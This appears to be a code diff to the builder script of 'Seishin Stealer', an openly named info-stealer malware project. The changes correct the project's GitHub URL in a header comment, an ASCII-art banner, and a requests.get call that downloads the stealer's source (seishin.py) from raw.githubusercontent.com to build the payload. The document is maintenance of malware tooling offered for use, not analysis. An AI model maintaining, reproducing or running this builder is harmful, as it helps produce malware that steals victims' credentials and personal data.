@@ -1,5 +1,5 @@
 #Seishin Stealer Was Made By Seishin
-#https://github.com/Angel02-script/Seishin_Stealer.git
+#https://github.com/Angel02-script/Seishin-Stealer.git
 
 import requests
 import os
@@ -33,7 +33,7 @@ def main():
                                     ╚════██║ ██╔══╝  ██║╚════██║ ██╔══██║██║██║╚██╗██║
                                      ██████╔╝███████╗██║ ██████╔╝██║  ██║██║██║ ╚████║
                                      ╚═════╝ ╚══════╝╚═╝ ╚═════╝ ╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝
-                                   https://github.com/Angel02-script/Seishin_Stealer.git
+                                   https://github.com/Angel02-script/Seishin-Stealer.git
                                                 Builder For Seishin Stealer
                                                         Par Seishin
 """))
@@ -58,7 +58,7 @@ def main():
     except Exception:
         pass
     try:
-        r = requests.get('https://raw.githubusercontent.com/Angel02-script/Seishin_Stealer/main/seishin.py')
+        r = requests.get('https://raw.githubusercontent.com/Angel02-script/Seishin-Stealer/main/seishin.py')
         r.raise_for_status()
         raw = r.text
     except Exception:
